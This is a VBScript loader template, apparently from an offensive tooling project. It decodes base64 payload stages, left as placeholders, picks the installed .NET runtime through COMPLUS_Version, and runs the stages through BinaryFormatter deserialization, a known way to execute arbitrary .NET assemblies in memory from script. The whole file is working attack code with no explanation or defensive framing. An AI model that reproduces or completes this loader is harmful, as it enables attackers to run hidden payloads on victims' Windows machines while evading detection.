Function Base64ToStream(b,l)
  Dim enc, length, transform, ms
  Set enc = CreateObject("System.Text.ASCIIEncoding")
  length = enc.GetByteCount_2(b)
  Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform")
  Set ms = CreateObject("System.IO.MemoryStream")
  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, l
  ms.Position = 0
  Set Base64ToStream = ms
End Function

Dim shell
Set shell = CreateObject("WScript.Shell")
Dim ver
ver = "v4.0.30319"
On Error Resume Next
shell.RegRead "HKLM\SOFTWARE\\Microsoft\.NETFramework\v4.0.30319\"
If Err.Number <> 0 Then
  ver = "v2.0.50727"
  Err.Clear
End If
shell.Environment("Process").Item("COMPLUS_Version") = ver

On Error Resume Next

Dim stage_1, stage_2
stage_1 = "%_STAGE1_%"
stage_2 = "%_STAGE2_%"

Dim fmt_1
Set fmt_1 = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
fmt_1.Deserialize_2(Base64ToStream(stage_1, %_STAGE1Len_%))

If Err.Number <> 0 Then
  Dim fmt_2
  Set fmt_2 = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
  fmt_2.Deserialize_2(Base64ToStream(stage_2, %_STAGE2Len_%))
End If

